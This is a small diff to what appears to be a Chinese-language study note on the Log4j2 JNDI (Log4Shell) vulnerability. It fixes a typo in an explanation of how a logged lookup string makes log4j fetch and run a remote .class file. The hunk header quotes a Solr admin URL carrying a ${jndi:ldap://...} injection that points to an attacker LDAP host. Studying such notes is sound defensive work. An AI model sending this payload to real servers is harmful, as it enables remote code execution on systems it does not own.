@@ -142,6 +142,6 @@ http://192.168.2.254:8983/solr/admin/cores?action=${jndi:ldap://192.168.2.14:138
 ### 原理
 
 - 当用户输入信息时,应用程序中的log4j2组件会将信息记录到日志中,假如日志中存在语句`{jnid:rmi://xxxx.dnslog.cn/bug}`,log4j就会去解析信息
-- 通过`jnid`的`lookup()`方法去解析该url,解析到`rmi`就回去rmi中找一个叫bug的资源,找不到就会去http服务中找
+- 通过`jndi`的`lookup()`方法去解析该url,解析到`rmi`就回去rmi中找一个叫bug的资源,找不到就会去http服务中找
 - 在http服务中找到shell之后,会将资源信息返回给应用程序的log4j组件,而log4j组件就会下载下来,发现bug是个`.class`文件,就会执行里面的代码,攻击者可以通过shell实现任意命令执行
 
